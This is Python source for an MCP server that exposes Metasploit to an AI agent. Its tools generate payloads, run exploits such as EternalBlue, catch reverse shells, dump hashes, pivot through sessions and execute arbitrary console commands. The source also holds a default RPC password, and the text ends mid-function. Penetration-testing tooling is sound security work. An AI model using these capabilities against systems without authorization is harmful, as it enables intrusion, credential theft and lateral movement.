#!/usr/bin/env python3
"""
OpenSploit MCP Server: metasploit

Exploitation framework with persistent sessions via msfrpcd.
Uses pymetasploit3 RPC client so sessions survive across tool calls.
"""

import asyncio
import base64
import ipaddress
import os
import re
import secrets
import tempfile
import time
from typing import Any, Dict, List, Optional, Tuple, Union

from pymetasploit3.msfrpc import MsfRpcClient, ShellSession, MeterpreterSession

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


# ─────────────────────────────────────────────────────────────────────────────
# Typed exception hierarchy (port from upstream's lib/msf/core/mcp/errors.rb)
#
# Each subclass carries error_class + retryable as class attributes; the handler
# layer translates these directly into ToolResult fields. This eliminates the
# `_classify_msf_error` heuristic that was substring-matching console output.
# ─────────────────────────────────────────────────────────────────────────────


class McpError(Exception):
    """Base for all metasploit MCP errors. Carries structured response metadata."""
    error_class: str = "unknown"
    retryable: bool = False

    def __init__(self, message: str, *, suggestions: Optional[List[str]] = None,
                 retryable: Optional[bool] = None, details: Optional[str] = None):
        super().__init__(message)
        self.suggestions: List[str] = suggestions or []
        self.details: Optional[str] = details
        if retryable is not None:
            # Allow per-instance override of the class default
            self.retryable = retryable


class ValidationError(McpError):
    """Caller passed an invalid argument (bad type, out of range, bad format)."""
    error_class = "invalid_parameter"
    retryable = False


class NetworkError(McpError):
    """Target unreachable, connection refused, timeout, etc."""
    error_class = "network"
    retryable = True


class SessionLostError(McpError):
    """Session no longer exists or has died."""
    error_class = "session_lost"
    retryable = False


class MsfApiError(McpError):
    """msfrpcd or msfconsole returned an unexpected error."""
    error_class = "tool_misconfigured"
    retryable = False


class RateLimitError(McpError):
    """Rate limit exceeded."""
    error_class = "rate_limited"
    retryable = True


class PermissionDeniedError(McpError):
    """Operation requires privileges we don't have."""
    error_class = "permission_denied"
    retryable = False


class AuthError(McpError):
    """Authentication to msfrpcd failed."""
    error_class = "auth_failed"
    retryable = False


# ─────────────────────────────────────────────────────────────────────────────
# InputValidator — constraint-dispatch validator (port from upstream's
# lib/msf/core/mcp/security/input_validator.rb)
#
# Single ``validate_parameter`` dispatches by constraint type:
#   - set/list/tuple → enum membership
#   - range          → integer in range
#   - re.Pattern     → regex match (with optional max_size)
#
# Domain validators (validate_module_name, validate_ip_or_cidr, etc.) compose
# constraints — adding a new validator means picking a constraint shape, not
# writing new validation logic.
# ─────────────────────────────────────────────────────────────────────────────


class InputValidator:
    """Constraint-dispatch input validation.

    All numeric constants are class attributes and referenced from input
    schemas (so the bounds appear in the tool's declared contract, not buried
    inside the call function).
    """

    # Pagination defaults (mirror upstream's LIMIT_DEFAULT/MIN/MAX)
    LIMIT_DEFAULT = 100
    LIMIT_MIN = 1
    LIMIT_MAX = 1000
    OFFSET_MAX = 100000

    # Module path: alphanumeric / underscore / slash / dash / dot
    _MODULE_NAME_RE = re.compile(r"^[\w/\-\.]+$")
    # Search query: printable ASCII only (no control chars, no embedded newlines)
    _SEARCH_QUERY_RE = re.compile(r"^[\x20-\x7e]+$")
    # Module type enum (8 standard types in metasploit)
    _MODULE_TYPES = frozenset({
        "all", "exploit", "auxiliary", "post", "payload", "encoder", "evasion", "nop",
    })

    @classmethod
    def validate_parameter(
        cls,
        name: str,
        value: Any,
        constraint: Any,
        *,
        allow_nil: bool = False,
        max_size: Optional[int] = None,
    ) -> None:
        """Generic constraint validator. Dispatches by ``constraint`` type.

        Raises ValidationError if invalid; returns None if valid.
        """
        # Empty / nil handling
        if value is None or (hasattr(value, "__len__") and len(value) == 0):
            if allow_nil:
                return
            raise ValidationError(f"{name} cannot be empty")

        if isinstance(constraint, (set, frozenset, list, tuple)):
            if value not in constraint:
                raise ValidationError(
                    f"Invalid {name}: {value!r}. Must be one of: {sorted(constraint)}",
                )
        elif isinstance(constraint, range):
            try:
                v = int(value)
            except (TypeError, ValueError):
                raise ValidationError(f"{name} must be an integer; got {value!r}")
            if v < constraint.start or v >= constraint.stop:
                raise ValidationError(
                    f"{name} must be in [{constraint.start}, {constraint.stop}); got {v}",
                )
        elif isinstance(constraint, re.Pattern):
            s = str(value)
            if max_size is not None and len(s) > max_size:
                raise ValidationError(f"{name} too long (max {max_size} characters)")
            if not constraint.match(s):
                raise ValidationError(f"Invalid {name} format: {value!r}")
        else:
            raise TypeError(f"Unsupported constraint type for {name}: {type(constraint).__name__}")

    # ── Domain validators (compose validate_parameter with the right constraint) ──

    @classmethod
    def validate_module_name(cls, name: str) -> None:
        cls.validate_parameter("module name", name, cls._MODULE_NAME_RE, max_size=500)

    @classmethod
    def validate_search_query(cls, query: str) -> None:
        cls.validate_parameter("search query", query, cls._SEARCH_QUERY_RE, max_size=500)

    @classmethod
    def validate_module_type(cls, module_type: str) -> None:
        cls.validate_parameter("module type", module_type, cls._MODULE_TYPES)

    @classmethod
    def validate_ip_or_cidr(cls, addr: Optional[str]) -> None:
        """Accepts None, single IP, or CIDR. Raises if non-empty and unparseable."""
        if not addr:
            return
        try:
            ipaddress.ip_network(addr, strict=False)
        except ValueError:
            raise ValidationError(f"Invalid IP address or CIDR: {addr!r}")

    @classmethod
    def validate_port(cls, port: Union[int, str, None], *, allow_nil: bool = True) -> None:
        cls.validate_parameter("port", port, range(1, 65536), allow_nil=allow_nil)

    @classmethod
    def validate_pagination(cls, limit: Optional[int], offset: Optional[int]) -> None:
        cls.validate_parameter(
            "limit", limit, range(cls.LIMIT_MIN, cls.LIMIT_MAX + 1), allow_nil=True,
        )
        cls.validate_parameter(
            "offset", offset, range(0, cls.OFFSET_MAX + 1), allow_nil=True,
        )

    @classmethod
    def validate_no_control_chars(cls, name: str, value: Any) -> None:
        """Reject newline/CR/null which would split msfconsole/shell command lines.

        Used everywhere we interpolate user-controlled strings into a console
        command. Replaces the old ad-hoc ``_validate_arg`` helper.
        """
        if value is None:
            return
        if not isinstance(value, str):
            return
        bad = {"\n": "newline", "\r": "carriage return", "\x00": "null byte"}
        for ch, label in bad.items():
            if ch in value:
                raise ValidationError(
                    f"Invalid {name!r}: contains {label}",
                    suggestions=[
                        "Strip newlines/control characters from the argument",
                        "For multi-command sequences use run_resource_script",
                    ],
                )


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────


def paginate(items: List[Any], limit: int, offset: int) -> Tuple[List[Any], Dict[str, int]]:
    """Slice ``items`` and return (page, metadata). Mirrors upstream's contract."""
    total = len(items)
    page = items[offset : offset + limit] if offset < total else []
    return page, {
        "total_items": total,
        "returned_items": len(page),
        "limit": limit,
        "offset": offset,
    }


def mcp_error_to_result(e: McpError, **extra_data) -> ToolResult:
    """Convert an McpError instance into a ToolResult with structured fields."""
    return ToolResult(
        success=False,
        data=extra_data,
        error=str(e),
        error_class=e.error_class,
        retryable=e.retryable,
        suggestions=e.suggestions,
    )


class MetasploitServer(BaseMCPServer):
    """MCP server wrapping Metasploit Framework via msfrpcd."""

    PAYLOAD_FORMATS = [
        "exe", "elf", "raw", "ruby", "python", "perl", "php", "asp",
        "aspx", "jsp", "war", "ps1", "psh", "vba", "c", "dll", "msi",
    ]

    COMMON_PAYLOADS = {
        "windows_reverse_tcp": "windows/meterpreter/reverse_tcp",
        "windows_reverse_https": "windows/meterpreter/reverse_https",
        "linux_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
        "linux_shell_tcp": "linux/x64/shell_reverse_tcp",
        "php_reverse": "php/meterpreter/reverse_tcp",
        "java_reverse": "java/meterpreter/reverse_tcp",
    }

    def __init__(self):
        super().__init__(
            name="metasploit",
            description="Exploitation framework with persistent sessions via msfrpcd",
            version="2.0.0",
        )

        self.client: Optional[MsfRpcClient] = None
        self.console = None  # Shared virtual console

        # Serialize all access to the shared console AND meterpreter sessions.
        # Three things share underlying state in subtle ways:
        #  1. Shared msfconsole (one read buffer; concurrent writers see
        #     each other's output) — list_hosts/list_services/list_creds
        #     issued in quick succession all returned through list_hosts's
        #     response while the other two came back empty.
        #  2. Meterpreter sessions over msgpack RPC — concurrent
        #     run_with_output calls on the same session interleave their
        #     write/poll cycles; the second caller often sees a {'error':
        #     ...} dict and pymetasploit3's helper raises KeyError 'data'
        #     when it tries to extract the data field. Verified live on
        #     Blue: portfwd_* batched with session_command on session 1
        #     all errored "Error: 'data'" after the first call won the
        #     race.
        #  3. msfrpcd auth tokens — pymetasploit3 caches them per-client,
        #     but RPC calls through different code paths may collide.
        #
        # A single global lock is the simplest correct fix. Throughput cost
        # is negligible because real workloads almost always issue calls
        # sequentially and msfconsole/meterpreter are single-track anyway.
        self._op_lock = asyncio.Lock()

        # Separate lock for first-time client/console initialization.
        # Many methods call _ensure_connected() OUTSIDE _op_lock (because
        # they then call _console_exec which itself takes _op_lock). If two
        # such methods race on first-call (client is None), without this
        # connect-lock both would create their own MsfRpcClient + shared
        # console. Last writer wins; the loser's console leaks and any
        # in-flight reference to the loser's console returns garbage. The
        # _connect_lock ensures exactly one coroutine drives initialization.
        self._connect_lock = asyncio.Lock()

        self.register_method(
            name="generate_payload",
            description="Generate a payload using msfvenom",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut (windows_reverse_tcp)",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP for reverse connections",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port for reverse connections",
                },
                "format": {
                    "type": "string",
                    "default": "raw",
                    "description": "Output format: exe, elf, raw, ruby, python, php, asp, c, dll, etc.",
                },
                "encoder": {
                    "type": "string",
                    "description": "Encoder to use (e.g., 'x86/shikata_ga_nai')",
                },
                "iterations": {
                    "type": "integer",
                    "default": 1,
                    "description": "Number of encoding iterations",
                },
            },
            handler=self.generate_payload,
        )

        self.register_method(
            name="search_modules",
            description="Search for Metasploit modules",
            params={
                "query": {
                    "type": "string",
                    "required": True,
                    "description": "Search query (e.g., 'ms17-010', 'apache struts', 'smb')",
                },
                "type": {
                    "type": "string",
                    "enum": ["all", "exploit", "auxiliary", "post", "payload"],
                    "default": "all",
                    "description": "Module type to search for",
                },
            },
            handler=self.search_modules,
        )

        self.register_method(
            name="check_vuln",
            description="Check if a target is vulnerable using an auxiliary scanner module",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options as key-value pairs",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.check_vuln,
        )

        self.register_method(
            name="run_exploit",
            description="Run an exploit module against a target",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "payload": {
                    "type": "string",
                    "description": "Payload to use",
                },
                "lhost": {
                    "type": "string",
                    "description": "Listening host for reverse payloads",
                },
                "lport": {
                    "type": "integer",
                    "description": "Listening port for reverse payloads",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout in seconds",
                },
                "disable_payload_handler": {
                    "type": "boolean",
                    "default": False,
                    "description": "If True, sets DisablePayloadHandler=true so the exploit does NOT start its own implicit handler. Use this when you've already started a separate handler() for the same payload — otherwise the exploit's implicit handler tries to bind the same LPORT and fails with 'Handler failed to bind'.",
                },
                "session_wait_seconds": {
                    "type": "integer",
                    "default": 30,
                    "description": "How long to poll for new sessions after exploit submission. Async exploits (typical for reverse-payload modules) can take 30-60+ seconds to actually create a session; the exploit -j console output returns synchronously when the JOB is queued, not when the exploit completes. Increase if you're targeting a slow link.",
                },
            },
            handler=self.run_exploit,
        )

        self.register_method(
            name="exec_command",
            description="Execute a command on target using an exploit with cmd/unix/generic payload",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path that supports command execution",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute on the target",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options (e.g., RPORT, TARGETURI)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.exec_command,
        )

        self.register_method(
            name="list_sessions",
            description="List active Meterpreter/shell sessions",
            params={
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.list_sessions,
        )

        self.register_method(
            name="session_command",
            description="Run a command in an active session",
            params={
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to interact with",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute in the session",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.session_command,
        )

        self.register_method(
            name="post_module",
            description="Run a post-exploitation module on a session",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Post module path (e.g., 'post/multi/gather/env')",
                },
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to run the module on",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.post_module,
        )

        self.register_method(
            name="handler",
            description="Start a multi/handler to catch reverse shells",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to listen for (e.g., 'windows_reverse_tcp')",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout waiting for connection (seconds)",
                },
                "exit_on_session": {
                    "type": "boolean",
                    "default": False,
                    "description": "If True, handler EXITS after first session connects. If False (default), handler stays running for multiple sessions. Maps directly to msfconsole's ExitOnSession option.",
                },
            },
            handler=self.handler,
        )

        # ── May 2026 expansion (Wave 2-5) ────────────────────────────────

        self.register_method(
            name="list_jobs",
            description="List active background jobs (handlers, listeners, exploit -j). Maps to msfconsole `jobs -l`.",
            params={},
            handler=self.list_jobs,
        )

        self.register_method(
            name="stop_job",
            description="Stop a background job. Either job_id (specific) or all_jobs=True (jobs -K).",
            params={
                "job_id": {"type": "integer", "description": "Specific job ID to stop"},
                "all_jobs": {"type": "boolean", "default": False, "description": "If True, stop all running jobs (jobs -K)"},
            },
            handler=self.stop_job,
        )

        self.register_method(
            name="session_kill",
            description="Kill a session. Either session_id (specific) or all_sessions=True (sessions -K).",
            params={
                "session_id": {"type": "integer", "description": "Specific session ID to kill"},
                "all_sessions": {"type": "boolean", "default": False, "description": "If True, kill all sessions (sessions -K)"},
            },
            handler=self.session_kill,
        )

        self.register_method(
            name="session_upgrade",
            description="Upgrade a shell session to meterpreter via post/multi/manage/shell_to_meterpreter (msfconsole `sessions -u <id>`). Critical workflow — most exploits return shells; post modules need meterpreter.",
            params={
                "session_id": {"type": "integer", "required": True, "description": "Session ID to upgrade (must be a shell session, not already meterpreter)"},
                "lhost": {"type": "string", "description": "Listening host for the new meterpreter callback (defaults to msf's default)"},
                "lport": {"type": "integer", "description": "Listening port for the new meterpreter callback"},
                "timeout": {"type": "integer", "default": 180, "description": "How long to wait for the upgrade to complete + new meterpreter session to appear"},
            },
            handler=self.session_upgrade,
        )

        self.register_method(
            name="module_info",
            description="Show full module information — description, options, references, targets, compatible payloads. Maps to msfconsole `info <module>` + `show options/targets/payloads`.",
            params={
                "module": {"type": "string", "required": True, "description": "Module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"},
            },
            handler=self.module_info,
        )

        self.register_method(
            name="route_add",
            description="Add a route through a session for pivoting. Maps to msfconsole `route add <subnet> <netmask> <session>`.",
            params={
                "subnet": {"type": "string", "required": True, "description": "Subnet to route (e.g., '10.10.20.0')"},
                "netmask": {"type": "string", "required": True, "description": "Netmask (e.g., '255.255.255.0' or '/24')"},
                "session_id": {"type": "integer", "required": True, "description": "Session ID to route through"},
            },
            handler=self.route_add,
        )

        self.register_method(
            name="route_list",
            description="List active routes. Maps to msfconsole `route print`.",
            params={},
            handler=self.route_list,
        )

        self.register_method(
            name="route_delete",
            description="Delete a route. Maps to msfconsole `route remove <subnet> <netmask> <sid>`. session_id is REQUIRED in msfconsole 6.4 (passing only subnet+netmask returns 'Missing arguments').",
            params={
                "subnet": {"type": "string", "required": True, "description": "Subnet to delete (e.g., '10.129.200.0')"},
                "netmask": {"type": "string", "required": True, "description": "Netmask (e.g., '255.255.255.0')"},
                "session_id": {"type": "integer", "required": True, "description": "Meterpreter session ID the route was bound to. Required by msfconsole 6.4."},
            },
            handler=self.route_delete,
        )

        self.register_method(
            name="portfwd_add",
            description="Set up local-to-remote port forwarding through a meterpreter session. Maps to meterpreter `portfwd add -l <local> -p <remote_port> -r <remote_host>`. Local-bind on attacker, traffic proxied through session to remote_host:remote_port.",
            params={
                "session_id": {"type": "integer", "required": True, "description": "Meterpreter session ID (must be a meterpreter session)"},
                "local_port": {"type": "integer", "required": True, "description": "Local port on attacker side that will forward"},
                "remote_host": {"type": "string", "required": True, "description": "Remote host reachable from the meterpreter session"},
                "remote_port": {"type": "integer", "required": True, "description": "Remote port on remote_host"},
            },
            handler=self.portfwd_add,
        )

        self.register_method(
            name="portfwd_list",
            description="List active port forwards in a meterpreter session. Maps to meterpreter `portfwd list`.",
            params={
                "session_id": {"type": "integer", "required": True, "description": "Meterpreter session ID"},
            },
            handler=self.portfwd_list,
        )

        self.register_method(
            name="portfwd_delete",
            description="Delete a port forward. Maps to meterpreter `portfwd delete -l <local>`.",
            params={
                "session_id": {"type": "integer", "required": True, "description": "Meterpreter session ID"},
                "local_port": {"type": "integer", "required": True, "description": "Local port to stop forwarding"},
            },
            handler=self.portfwd_delete,
        )

        self.register_method(
            name="db_nmap",
            description="Run nmap inside msfconsole — scan results auto-import into the workspace database. Maps to msfconsole `db_nmap <args>`. Requires DB-enabled msfrpcd (entrypoint enables postgres + msfdb init).",
            params={
                "args": {"type": "string", "required": True, "description": "nmap command-line arguments (target + flags). Example: '-sV -p 22,80,445 10.10.10.40'"},
                "timeout": {"type": "integer", "default": 600, "description": "Timeout in seconds — large scans can take a while"},
            },
            handler=self.db_nmap,
        )

        self.register_method(
            name="db_import",
            description="Import scan data from a file (nmap XML, nessus, etc.) into the workspace DB. Maps to msfconsole `db_import <path>`.",
            params={
                "file_path": {"type": "string", "required": True, "description": "Path to scan file inside the container (use /session/... for files written from outside)"},
            },
            handler=self.db_import,
        )

        self.register_method(
            name="list_hosts",
            description="List hosts in the workspace database. Maps to msfconsole `hosts`. Populated by run_exploit, db_import, db_nmap.",
            params={
                "address": {"type": "string", "description": "Filter to a specific address"},
            },
            handler=self.list_hosts,
        )

        self.register_method(
            name="list_services",
            description="List services in the workspace database. Maps to msfconsole `services`. Populated by db_nmap, run_exploit auxiliary scanners, etc.",
            params={
                "host": {"type": "string", "description": "Filter to a specific host address"},
                "port": {"type": "integer", "description": "Filter to a specific port"},
            },
            handler=self.list_services,
        )

        self.register_method(
            name="list_creds",
            description="List credentials in the workspace database. Maps to msfconsole `creds`. Populated by post_module hashdump, login_check auxiliary scanners, etc.",
            params={
                "host": {"type": "string", "description": "Filter to a specific host"},
            },
            handler=self.list_creds,
        )

        self.register_method(
            name="list_loot",
            description="List loot (gathered files: SAM hashes, configs, etc.) in the workspace. Maps to msfconsole `loot`.",
            params={},
            handler=self.list_loot,
        )

        self.register_method(
            name="list_notes",
            description="List engagement notes in the workspace. Maps to msfconsole `notes`.",
            params={},
            handler=self.list_notes,
        )

        self.register_method(
            name="run_resource_script",
            description="Execute a sequence of msfconsole commands (resource script). Maps to msfconsole `resource <file.rc>` but accepts inline content. Useful for repeatable workflows or when chaining commands that the named methods don't cover cleanly.",
            params={
                "commands": {"type": "string", "required": True, "description": "Multi-line msfconsole commands (one per line) to execute in sequence"},
                "timeout": {"type": "integer", "default": 600, "description": "Timeout in seconds for the entire script"},
            },
            handler=self.run_resource_script,
        )

        self.register_method(
            name="run_console",
            description="Generic msfconsole command escape hatch — execute arbitrary msfconsole input and return raw output. Use this when a named method doesn't cover what you need (e.g., niche `show` variants, plugin commands, debugging). Power feature; prefer the structured named methods when they fit.",
            params={
                "command": {"type": "string", "required": True, "description": "msfconsole command (single line or multi-line). Example: 'show advanced' after `use <module>`"},
                "timeout": {"type": "integer", "default": 60, "description": "Timeout in seconds"},
            },
            handler=self.run_console,
        )

    # ── Helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _validate_arg(name: str, value: Any) -> Optional[ToolResult]:
        """Reject control characters that would break msfconsole parsing.

        Returns ``None`` if the value is valid, or a ``ToolResult`` with
        ``success=False`` and ``error_class="invalid_parameter"`` if the
        value contains a character that would split an msfconsole line.

        Caller pattern: ``if err := self._validate_arg("rhosts", rhosts): return err``

        We use the return-on-failure pattern (instead of raising) so the
        ``error_class`` lands directly in the structured response without
        depending on exception classification — verified gap from
        Scenario G live testing where raised ToolError lost the class.

        The two escape hatches that intentionally accept multi-line
        input — ``run_console`` and ``run_resource_script`` — bypass this
        check.
        """
        if value is None or not isinstance(value, str):
            return None
        bad = {"\n": "newline", "\r": "carriage return", "\x00": "null byte"}
        for ch, label in bad.items():
            if ch in value:
                return ToolResult(
                    success=False,
                    data={"argument": name},
                    error=f"Invalid {name!r}: contains {label}",
                    error_class="invalid_parameter",
                    retryable=False,
                    suggestions=[
                        "Strip newlines and control characters from the argument",
                        "For multi-command sequences use run_resource_script (intentionally accepts newlines)",
                    ],
                )
        return None

    def _validate_options(self, options: Optional[Dict[str, Any]]) -> Optional[ToolResult]:
        """Validate every value in an `options` dict. Returns None or first failure."""
        if not options:
            return None
        for k, v in options.items():
            if isinstance(v, str):
                err = self._validate_arg(f"options[{k}]", v)
                if err is not None:
                    return err
        return None

    @staticmethod
    def _classify_msf_error(output: str) -> Optional[McpError]:
        """Classify metasploit-specific error patterns into a typed McpError.

        Returns an McpError instance whose subclass + ``error_class`` /
        ``retryable`` / ``suggestions`` attributes carry all the structured
        metadata the response layer needs. Returns ``None`` if no error
        pattern matched (clean output / non-error text).

        This stays a substring-matcher because msfconsole's text output is
        the only data we get for SOME failure paths (escape-hatch
        run_console output, bare ToolError messages from upstream
        timeouts). The structured-RPC paths in run_exploit / list_hosts /
        etc. raise typed exceptions DIRECTLY and don't go through here.
        """
        lower = output.lower()

        # Validation errors propagated from raised ValidationError
        if "contains newline" in lower or "contains carriage return" in lower or "contains null byte" in lower:
            return ValidationError(output, suggestions=[
                "Strip newlines and control characters from the argument",
                "For multi-command sequences use run_resource_script (which intentionally accepts newlines)",
            ])

        if "timed out" in lower or "unreachable" in lower:
            return NetworkError(output, suggestions=[
                "Check that the target host is reachable",
                "Increase timeout if the target is behind a slow link",
            ])
        if "connection refused" in lower or "connectionrefused" in lower:
            return NetworkError(output, suggestions=[
                "Target port may be closed or service not running",
                "Verify the target IP and port are correct",
            ])
        if "unknown datastore option" in lower:
            return ValidationError(output, suggestions=[
                "Check module options with 'module_info' or msf docs",
                "The option name may be misspelled or not supported by this module",
            ])
        if "module not found" in lower or "failed to load" in lower:
            return MsfApiError(output, suggestions=[
                "Use search_modules to verify the module path",
            ])
        if "handler failed to bind" in lower or "address is already in use" in lower:
            return ValidationError(output, suggestions=[
                "The port is already in use by another handler or process",
                "Choose a different LPORT value (or stop the prior handler with stop_job)",
            ])
        if "post failed:" in lower or "activerecord::recordinvalid" in lower or "session can't be blank" in lower:
            return MsfApiError(output, suggestions=[
                "post_module's DB write path failed (known msfrpcd limitation for credential modules)",
                "For SAM dump use session_command(<sid>, 'hashdump') — meterpreter built-in, no DB write",
            ])
        if "invalid session" in lower or "session id is not valid" in lower or "no compatible sessions" in lower:
            return ValidationError(output, suggestions=[
                "session_id doesn't match any active session, or session type isn't compatible with the module",
                "Run list_sessions to enumerate; convert shell to meterpreter via session_upgrade if needed",
            ])
        if "session" in lower and ("not found" in lower or "dead" in lower or "closed" in lower):
            return SessionLostError(output, suggestions=[
                "The session may have died; use list_sessions to check active sessions",
                "Re-exploit the target if the session is permanently gone",
            ])

        # No known error pattern matched — caller decides what to do.
        return None

    def _resolve_payload(self, payload: str) -> str:
        """Resolve payload shortcut to full name."""
        return self.COMMON_PAYLOADS.get(payload, payload)

    @staticmethod
    def _parse_msf_table(output: str) -> List[Dict[str, str]]:
        """Parse a generic msfconsole table into a list of row dicts.

        msfconsole tables follow this shape:

            Header
            ======

            col1   col2   col3
            ----   ----   ----
            v1     v2     v3
            v4     v5     v6

        We split on the dashes-row to find column boundaries. Falls back
        to whitespace-split if the dash row is missing or malformed.
        Tables with no rows return [].
        """
        if not output:
            return []

        lines = [ln for ln in output.split("\n")]
        # Find the dash row (it's the structural anchor — header is the
        # line above; data follows until first blank line).
        dash_idx = None
        for i, ln in enumerate(lines):
            stripped = ln.strip()
            if stripped and set(stripped.replace(" ", "")) == {"-"}:
                dash_idx = i
                break
        if dash_idx is None or dash_idx == 0:
            return []

        header_line = lines[dash_idx - 1]
        dash_line = lines[dash_idx]

        # Compute column boundaries from the dash line
        col_spans: List[tuple] = []
        in_dash = False
        start = 0
        for j, ch in enumerate(dash_line):
            if ch == "-":
                if not in_dash:
                    start = j
                    in_dash = True
            else:
                if in_dash:
                    col_spans.append((start, j))
                    in_dash = False
        if in_dash:
            col_spans.append((start, len(dash_line)))

        # Extract column names by header slicing
        col_names = [header_line[s:e].strip() for s, e in col_spans]

        rows: List[Dict[str, str]] = []
        for ln in lines[dash_idx + 1:]:
            if not ln.strip():
                if rows:
                    break  # blank row terminates table when we have data
                continue
            row: Dict[str, str] = {}
            for (s, e), name in zip(col_spans, col_names):
                # Last column extends to EOL to capture trailing wide values
                if (s, e) == col_spans[-1]:
                    val = ln[s:].strip()
                else:
                    val = ln[s:e].strip()
                row[name] = val
            rows.append(row)

        return rows

    async def _ensure_connected(self) -> None:
        """Lazy-init RPC client and shared console. Retries up to 60s.

        Liveness check uses ``client.core.version`` as a *property* read
        (returns a dict like ``{'version': '6.4.x', 'ruby': '...', 'api': '1.0'}``).
        Calling it as ``client.core.version()`` raises ``TypeError: 'dict'
        object is not callable`` — that's a real bug we hit live: every call
        flagged "connection lost" and span a fresh shared console, breaking
        the per-console DB state (db_nmap → list_services lost the DB).

        Concurrency note: this method is safe to call from inside or
        outside ``self._op_lock``. The "client is None" double-check uses
        an internal mutex (``self._connect_lock``) so two concurrent
        first-callers don't both create separate clients/consoles. The
        second caller waits, the first caller initializes, then the second
        caller's ``self.client is not None`` early-out kicks in.
        """
        # Fast path: already connected and live
        if self.client is not None:
            try:
                _ = self.client.core.version  # property access, not a call
                if not isinstance(_, dict) or "version" not in _:
                    raise RuntimeError(f"unexpected core.version payload: {_!r}")
                return
            except Exception as e:
                self.logger.warning(f"msfrpcd connection lost ({e!r}), reconnecting...")
                # Fall through into the locked init path

        # Slow path: initialize under the connect-mutex so first-call races
        # don't double-initialize (which would leak one console/client and
        # the second caller would see the FIRST init's stale references
        # before the LAST writer wins the race).
        async with self._connect_lock:
            # Re-check under the lock — another coroutine may have
            # initialized while we were waiting.
            if self.client is not None:
                try:
                    _ = self.client.core.version
                    if isinstance(_, dict) and "version" in _:
                        return
                except Exception:
                    pass  # fall through to reconnect
            self.client = None
            self.console = None

            await self._connect_locked()

    async def _connect_locked(self) -> None:
        """Connect attempt loop. MUST be called with _connect_lock held."""
        password = os.environ.get("MSF_PASSWORD", "msfpassword")
        last_err = None

        for attempt in range(30):
            try:
                self.client = MsfRpcClient(
                    password, server="127.0.0.1", port=55553, ssl=False
                )
                self.logger.info("Connected to msfrpcd")

                # Create shared console
                self.console = self.client.consoles.console()

                # Wait for console to initialize and drain banner
                await asyncio.sleep(2)
                self.console.read()
                self.logger.info(f"Created shared console (cid={self.console.cid})")

                # Defensive db_connect: msfrpcd auto-loads database.yml on
                # startup, so the daemon's framework has DB. But each new
                # console created via consoles.console() does NOT always
                # inherit the active workspace/connection in older MSF builds.
                # We explicitly run `db_connect -y <yaml>` on the freshly
                # created shared console — idempotent (msfconsole prints
                # "Already connected to <db>" if already connected). Cheap
                # (~50 ms). Skipped if database.yml not present (no-DB mode).
                db_yaml = "/usr/share/metasploit-framework/config/database.yml"
                if os.path.exists(db_yaml):
                    try:
                        self.console.write(f"db_connect -y {db_yaml}\n")
                        await asyncio.sleep(0.5)
                        # Drain so subsequent _console_exec sees a clean buffer
                        for _ in range(10):
                            res = self.console.read()
                            if not res.get("busy"):
                                break
                            await asyncio.sleep(0.2)
                        self.logger.info("db_connect issued on shared console")
                    except Exception as db_e:
                        self.logger.warning(f"db_connect failed (continuing): {db_e!r}")
                return

            except Exception as e:
                last_err = e
                self.logger.warning(
                    f"msfrpcd not ready (attempt {attempt + 1}/30): {e}"
                )
                self.client = None
                self.console = None
                await asyncio.sleep(2)

        raise ToolError(
            message="Failed to connect to msfrpcd after 60 seconds",
            details=str(last_err),
        )

    async def _console_exec(self, commands: str, timeout: int = 120) -> str:
        """Write commands to shared console and poll until complete.

        Holds ``self._op_lock`` for the entire write→read cycle so
        concurrent tools/call requests are serialized.
        """
        async with self._op_lock:
            return await self._console_exec_locked(commands, timeout)

    async def _console_exec_locked(self, commands: str, timeout: int) -> str:
        await self._ensure_connected()

        # Drain any pending output from previous commands
        await asyncio.to_thread(self.console.read)

        # Write commands to console
        await asyncio.to_thread(self.console.write, commands + "\n")

        # Poll until console is no longer busy
        output = ""
        start = time.time()
